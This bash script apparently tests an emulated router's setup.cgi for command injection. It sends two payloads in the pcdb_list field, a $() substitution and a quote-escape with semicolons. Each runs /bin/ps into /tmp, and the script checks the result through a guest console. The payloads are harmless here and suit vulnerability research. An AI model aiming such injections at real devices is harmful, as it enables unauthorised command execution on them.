#!/bin/bash
TARGET=http://127.0.0.1:16358
AUTH=admin:password
SOCK=<rehost-dir>
guest(){ (printf "%s\n" "$1"; sleep 2) | socat -t 8 - UNIX-CONNECT:$SOCK 2>/dev/null | tr -d '\r'; }

echo "=== Test A: 无空格 \$() 载荷 pcdb_list=Z\$(/bin/ps>/tmp/e1) ==="
guest "rm -f /tmp/e1 /tmp/yiyi" >/dev/null
curl -s -u "$AUTH" --max-time 25 -o /dev/null -w "HTTP:%{http_code}\n" "$TARGET/setup.cgi" \
 --data-urlencode "todo=edit" --data-urlencode "this_file=pc_dba.htm" \
 --data-urlencode 'pcdb_list=Z$(/bin/ps>/tmp/e1)'
sleep 2
echo "--- yiyi 内容:"; guest "cat /tmp/yiyi" | tail -5
echo "--- /tmp/e1:"; guest "ls -la /tmp/e1" | tail -3; guest "cat /tmp/e1" | head -4

echo "=== Test B: 引号逃逸载荷 pcdb_list=x\";/bin/ps>/tmp/e2;\" ==="
guest "rm -f /tmp/e2 /tmp/yiyi" >/dev/null
curl -s -u "$AUTH" --max-time 25 -o /dev/null -w "HTTP:%{http_code}\n" "$TARGET/setup.cgi" \
 --data-urlencode "todo=edit" --data-urlencode "this_file=pc_dba.htm" \
 --data-urlencode 'pcdb_list=x";/bin/ps>/tmp/e2;"'
sleep 2
echo "--- yiyi 内容:"; guest "cat /tmp/yiyi" | tail -5
echo "--- /tmp/e2:"; guest "ls -la /tmp/e2" | tail -3; guest "cat /tmp/e2" | head -4
